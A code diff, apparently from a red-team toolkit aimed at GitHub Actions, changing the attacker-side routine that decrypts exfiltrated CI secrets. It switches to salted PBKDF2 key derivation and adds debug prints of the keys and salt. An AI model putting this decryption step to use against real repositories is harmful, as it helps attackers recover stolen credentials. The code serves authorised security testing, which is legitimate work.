@@ -12,6 +12,9 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives.ciphers import Cipher
 from cryptography.hazmat.primitives.ciphers import algorithms
 from cryptography.hazmat.primitives.ciphers import modes
+from cryptography.hazmat.primitives import hashes
+
+import hashlib
 
 from gato.github import Api
 from gato.git import Git
@@ -557,25 +560,33 @@ class Attacker:
 
                 if len(blob) == 3:
                     encrypted_secrets = base64.b64decode(blob[1])
-                    iv = encrypted_secrets[:16]
-                    enc = encrypted_secrets[16:]
+                    salt = encrypted_secrets[8:16]
+                    ciphertext = encrypted_secrets[16:]
 
                     encrypted_key = base64.b64decode(blob[2])
-
-                    Output.owned(
-                        "Decrypted and Decoded Secrets:\n"
-                    )
-
                     sym_key_b64 = priv_key.decrypt(encrypted_key,
                                                padding.PKCS1v15()).decode()
                     sym_key = base64.b64decode(sym_key_b64)
 
-                    cipher = Cipher(algorithms.AES256(sym_key), modes.CBC(iv))
-                    decrypt = cipher.decryptor()
+                    print(type(sym_key), type(salt))
 
-                    print(decrypt.update(enc) + decrypt.finalize())
-                    #print(base64.b64encode(encrypted_secrets))
-                    #print(base64.b64encode(sym_key))
+                    derived_key = hashlib.pbkdf2_hmac('sha256', sym_key, salt, 10000, 48)
+                    key = derived_key[0:32]
+                    iv = derived_key[32:48]
+
+                    cipher = Cipher(algorithms.AES256(key), modes.CBC(iv))
+                    decryptor = cipher.decryptor()
+
+                    print(blob[1], sym_key_b64)
+                    Output.owned(
+                        "Decrypted and Decoded Secrets:\n"
+                    )
+
+                    print(decryptor.update(ciphertext) + decryptor.finalize())
+
+                    print("salt", salt.hex())
+                    print("iv", iv.hex())
+                    print("key", key.hex())
 
                 else:
                     Output.error(
